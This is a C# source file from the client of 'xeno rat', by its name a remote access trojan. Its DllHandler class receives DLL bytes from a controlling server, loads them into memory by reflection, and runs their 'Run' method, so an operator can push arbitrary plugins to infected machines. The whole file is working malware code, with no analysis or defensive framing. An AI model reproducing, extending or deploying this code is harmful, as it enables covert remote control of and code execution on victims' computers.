using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    class DllHandler
    {

        public DllHandler()
        {
            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
        }

        public Dictionary<string, Assembly> Assemblies = new Dictionary<string, Assembly>();
        public string classpath = "Plugin.Main";

        /// <summary>
        /// Handles the incoming requests for loading and executing DLLs on the server.
        /// </summary>
        /// <param name="subServer">The Node representing the sub-server.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the handling of DLL loading and execution.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method receives a Node representing the sub-server and handles the loading and execution of DLLs based on the incoming requests.
        /// It first receives the name of the DLL to be loaded, checks if the DLL is already loaded in the Assemblies dictionary, and loads the DLL if not present.
        /// After loading the DLL, it creates an instance of the class specified by the 'classpath' variable and invokes the 'Run' method using reflection.
        /// If any exception occurs during the process, it sends a failure message along with the exception details to the sub-server.
        /// </remarks>
        public async Task DllNodeHandler(Node subServer)
        {
            byte[] getdll = new byte[] { 1 };
            byte[] hasdll = new byte[] { 0 };
            byte[] fail = new byte[] { 2 };
            byte[] success = new byte[] { 3 };
            try
            {
                byte[] name = await subServer.ReceiveAsync();
                string dllname = Encoding.UTF8.GetString(name);
                Console.WriteLine(dllname);
                if (!Assemblies.ContainsKey(dllname))
                {
                    await subServer.SendAsync(getdll);
                    byte[] dll_bytes = await subServer.ReceiveAsync();
                    Console.WriteLine(dll_bytes.Length);
                    Assemblies[dllname] = Assembly.Load(dll_bytes);
                }
                else
                {
                    await subServer.SendAsync(hasdll);
                }
                object ActivatedDll = Activator.CreateInstance(Assemblies[dllname].GetType(classpath));

                MethodInfo method = ActivatedDll.GetType().GetMethod("Run", BindingFlags.Instance | BindingFlags.Public);
                await (Task)method.Invoke(ActivatedDll, new object[] { subServer });
            }
            catch (Exception e)
            {
                await subServer.SendAsync(fail);
                await subServer.SendAsync(Encoding.UTF8.GetBytes(e.Message));
                Console.WriteLine(e.StackTrace);
            }
        }

        /// <summary>
        /// Resolves the assembly reference and returns the corresponding assembly if the name matches "xeno rat client".
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="args">The event data.</param>
        /// <returns>The assembly if the name matches "xeno rat client"; otherwise, null.</returns>
        private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            if (new AssemblyName(args.Name).Name == "xeno rat client")
            {
                return Assembly.GetExecutingAssembly();
            }
            return null;
        }
    }
}